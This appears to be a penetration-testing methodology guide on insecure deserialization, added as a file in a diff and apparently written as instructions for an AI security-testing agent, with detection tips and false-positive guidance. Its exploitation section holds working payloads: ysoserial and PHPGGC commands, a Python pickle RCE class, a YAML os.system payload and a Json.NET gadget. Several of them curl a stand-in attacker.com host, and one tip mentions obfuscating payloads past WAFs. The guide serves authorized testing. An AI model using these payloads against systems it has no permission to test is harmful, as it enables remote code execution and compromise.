@@ -1,0 +1,302 @@
+<deserialization_vulnerability_guide>
+<title>INSECURE DESERIALIZATION</title>
+
+<critical>Insecure deserialization occurs when applications deserialize untrusted data, allowing attackers to inject malicious objects that execute code, bypass authentication, or manipulate application logic. This typically leads to remote code execution (RCE) and is considered one of the most severe vulnerability classes due to its direct path to full system compromise.</critical>
+
+<scope>
+- Java: ObjectInputStream, XMLDecoder, XStream, Fastjson, Jackson with enableDefaultTyping
+- PHP: unserialize(), Phar deserialization, various frameworks
+- Python: pickle, PyYAML load(), marshal, shelve
+- Ruby: Marshal.load, YAML.load, Oj.load
+- .NET: BinaryFormatter, SoapFormatter, NetDataContractSerializer, Json.Net TypeNameHandling
+- Node.js: node-serialize, serialize-javascript with eval
+- Language-agnostic: OGNL, MVEL, SpEL expression injection
+</scope>
+
+<methodology>
+1. Identify serialization formats: Look for magic bytes, base64 patterns, or known structures.
+2. Determine technology stack: Java, PHP, Python, .NET, Ruby, Node.js.
+3. Locate deserialization entry points: Cookies, session tokens, API parameters, files.
+4. Test for deserialization with timing, error, or callback payloads.
+5. Exploit with technology-specific gadget chains.
+6. Demonstrate RCE or significant impact.
+</methodology>
+
+<discovery_techniques>
+<identify_serialized_data>
+Magic bytes and patterns:
+- Java: `0xaced0005` (base64: rO0AB), `0x3c3f786d6c` (XML)
+- PHP: `a:`, `O:`, `s:` prefixes (array, object, string)
+- Python pickle: `0x80` or `(` prefix, often base64 encoded
+- .NET BinaryFormatter: `0x00010000` prefix
+- Ruby Marshal: `0x0408` prefix
+- YAML: `!ruby/object:` or `!!python/object:` tags
+- JSON with type info: `$type`, `@class`, `__type`
+
+Common locations:
+- Cookies (especially session cookies)
+- Hidden form fields (ViewState in .NET)
+- API parameters (especially POST body)
+- JWT tokens (when containing serialized objects)
+- WebSocket messages
+- File uploads
+</identify_serialized_data>
+
+<java_detection>
+- Look for base64 starting with `rO0AB`
+- Check for XMLDecoder usage
+- Identify known vulnerable libraries: Commons Collections, Spring, Hibernate
+- Test with ysoserial generated payloads
+- Use DNS/HTTP callbacks for blind detection
+</java_detection>
+
+<php_detection>
+- Look for `O:` prefix in cookies or parameters
+- Check for `unserialize()` in code if source available
+- Phar files: Check for phar:// wrapper usage
+- Test with PHPGGC generated payloads
+</php_detection>
+
+<python_detection>
+- Base64 encoded data starting with `gASV` or `Y...` (pickle)
+- YAML files with `!!python/object:` tags
+- Look for pickle.loads(), yaml.load(), eval()
+- Test with custom pickle payload
+</python_detection>
+
+<dotnet_detection>
+- ViewState (base64 in __VIEWSTATE field)
+- Look for TypeNameHandling in JSON.NET config
+- SOAP messages with serialized objects
+- BinaryFormatter usage in services
+</dotnet_detection>
+</discovery_techniques>
+
+<exploitation>
+<java_exploitation>
+Using ysoserial:
+```bash
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/pwned' | base64
+```
+
+Common gadget chains:
+- CommonsCollections1-7: Apache Commons Collections
+- Jdk7u21: Pure JDK gadget (older Java)
+- Spring1/Spring2: Spring Framework
+- Hibernate1/2: Hibernate
+- JBossInterceptors1: JBoss
+- Groovy1: Groovy libraries
+
+Blind detection with DNS:
+```bash
+java -jar ysoserial.jar URLDNS 'http://unique.burpcollaborator.net' | base64
+```
+</java_exploitation>
+
+<php_exploitation>
+Using PHPGGC:
+```bash
+phpggc Laravel/RCE1 system 'id' | base64
+```
+
+Common chains:
+- Laravel RCE, Symfony, Monolog
+- Guzzle, Slim, WordPress
+- Magento, Drupal specific chains
+
+Phar exploitation:
+1. Create phar with malicious serialized data
+2. Trigger via phar:// wrapper: `phar://path/to/file.phar`
+3. File operations that accept URLs may trigger deserialization
+</php_exploitation>
+
+<python_exploitation>
+Pickle RCE:
+```python
+import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker.com/pwned',))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+```
+
+YAML exploitation:
+```yaml
+!!python/object/apply:os.system ['curl http://attacker.com']
+```
+</python_exploitation>
+
+<dotnet_exploitation>
+Using ysoserial.net:
+```bash
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c curl http://attacker.com"
+```
+
+Common gadgets:
+- WindowsIdentity
+- TypeConfuseDelegate
+- ObjectDataProvider
+- TextFormattingRunProperties
+
+Json.NET with TypeNameHandling:
+```json
+{
+  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$type": "System.Collections.ArrayList",
+    "$values": ["cmd", "/c calc"]
+  },
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System"
+  }
+}
+```
+</dotnet_exploitation>
+
+<blind_detection>
+When no direct output:
+1. DNS callbacks: Use Burp Collaborator, Interactsh, or dnslog
+2. HTTP callbacks: Out-of-band HTTP request to attacker server
+3. Time delays: Payloads that cause measurable delay
+4. Error-based: Different errors for valid vs invalid serialized data
+5. File creation: Write file, verify via other vuln or access
+</blind_detection>
+</exploitation>
+
+<validation>
+1. Demonstrate actual code execution (callback, file creation, command output).
+2. Use appropriate gadget chain for the target technology and libraries.
+3. Confirm the deserialization occurs server-side, not just client rendering.
+4. Document the serialization format, entry point, and payload used.
+5. Verify reproducibility with the same payload.
+6. If blind, use multiple confirmation methods (DNS + HTTP).
+</validation>
+
+<false_positives>
+- Base64 data that looks like serialization but isn't (random data)
+- Serialization with signatures that prevent tampering (signed ViewState)
+- Whitelisted class deserialization
+- Client-side serialization (JavaScript) without server processing
+- Error messages mentioning serialization but not from attacker input
+- Outdated libraries present but not used in deserialization path
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. LIBRARY PRESENCE VS EXPLOITABILITY:
+   WRONG: "Apache Commons Collections found in classpath, RCE via deserialization"
+   RIGHT: Having a vulnerable library is NOT sufficient:
+          - Application must actually deserialize untrusted data
+          - Gadget chain must be reachable (not all classes loaded)
+          - Serialization format must match (ObjectInputStream vs JSON)
+          Identify ACTUAL deserialization sink with user input.
+
+2. BASE64 DATA ASSUMPTION:
+   WRONG: "Found base64 in cookie that decodes to binary, deserialization vulnerability"
+   RIGHT: Not all binary data is serialized objects:
+          - Could be encrypted session data
+          - Could be protobuf, MessagePack, or other formats
+          - Could be compressed data
+          Identify specific serialization format by magic bytes.
+
+3. SIGNED/ENCRYPTED SERIALIZATION:
+   WRONG: "ViewState contains serialized data, can inject malicious objects"
+   RIGHT: Many serialization mechanisms are protected:
+          - ViewState MAC prevents tampering (when enabled)
+          - JWT signatures prevent modification
+          - Encrypted cookies cannot be manipulated
+          Check for signature validation before claiming exploitable.
+
+4. CLIENT-SIDE SERIALIZATION:
+   WRONG: "JavaScript uses JSON.parse with type info, deserialization RCE"
+   RIGHT: Client-side deserialization affects only the user's browser:
+          - Not RCE on server
+          - May be prototype pollution or XSS instead
+          - Different vulnerability class
+          Focus on SERVER-SIDE deserialization.
+
+5. ERROR MESSAGE CONFUSION:
+   WRONG: "Error mentions 'deserialization failed', vulnerability confirmed"
+   RIGHT: Deserialization errors don't prove exploitability:
+          - May be legitimate application data failing to deserialize
+          - Error on YOUR malformed input ≠ exploitable
+          - Need to prove EXECUTION, not just parsing
+          Demonstrate actual code execution.
+
+6. GADGET CHAIN AVAILABILITY:
+   WRONG: "Java app found, will use ysoserial CommonsCollections5"
+   RIGHT: Gadget chains require specific libraries:
+          - Must have the exact version of vulnerable library
+          - Library must be in classpath during deserialization
+          - Some chains require specific configurations
+          Test multiple chains; absence of one doesn't mean unexploitable.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. PROTECTED SERIALIZATION:
+   - ViewState with MAC enabled (default in modern .NET)
+   - Signed JWTs containing serialized data
+   - Encrypted session cookies
+   - HMAC-validated serialized tokens
+
+2. LIBRARY PRESENT BUT UNUSED:
+   - Vulnerable library in dependencies but not in deserialization path
+   - Library used but not for user-controlled input
+   - Updated library but old version in scan report
+
+3. WRONG SERIALIZATION FORMAT:
+   - JSON.NET without TypeNameHandling.Auto/All
+   - Jackson without enableDefaultTyping
+   - XStream with whitelist
+   - Protobuf or other safe binary formats
+
+4. CLIENT-SIDE ONLY:
+   - JavaScript JSON.parse (not RCE)
+   - Browser-side deserialization
+   - Local storage data
+
+5. DESERIALIZATION OF TRUSTED DATA:
+   - Internal service-to-service communication
+   - Signed data from trusted source
+   - Database-stored objects with integrity checks
+
+6. MITIGATION IN PLACE:
+   - Object input filter/whitelist (Java 9+)
+   - SafeUnserializer or similar protections
+   - Custom deserialization logic with validation
+</expanded_false_positives>
+
+<impact>
+- Remote code execution (most common outcome)
+- Authentication bypass via session manipulation
+- SQL injection via deserialized SQL objects
+- File system access via file operation gadgets
+- Server-side request forgery via HTTP gadgets
+- Denial of service via resource exhaustion
+- Privilege escalation via trust boundary bypass
+- Data exfiltration via constructed queries
+</impact>
+
+<pro_tips>
+1. Use DNS callbacks for initial detection - they work even through firewalls.
+2. ysoserial and PHPGGC require matching library versions - enumerate dependencies.
+3. Java: Check for serialVersionUID compatibility between payload and target.
+4. PHP: Modern frameworks often use whitelists - check for custom handlers.
+5. Python: pickle is almost always vulnerable; YAML depends on loader used.
+6. .NET: ViewState requires knowledge of machineKey for exploitation.
+7. Multiple gadgets may work - if one fails, try others for same library.
+8. Time-based detection: Use gadgets that cause delay (Thread.sleep, endless loops).
+9. Check for object input filters (Java) or custom deserializers that may block gadgets.
+10. Some WAFs detect ysoserial payloads - obfuscation or alternative chains may help.
+</pro_tips>
+
+<remember>Insecure deserialization requires demonstrating that untrusted user input reaches a deserialization function and that a viable gadget chain exists to achieve code execution. Library presence alone is not a vulnerability - you must prove the complete chain from user input to code execution.</remember>
+</deserialization_vulnerability_guide>
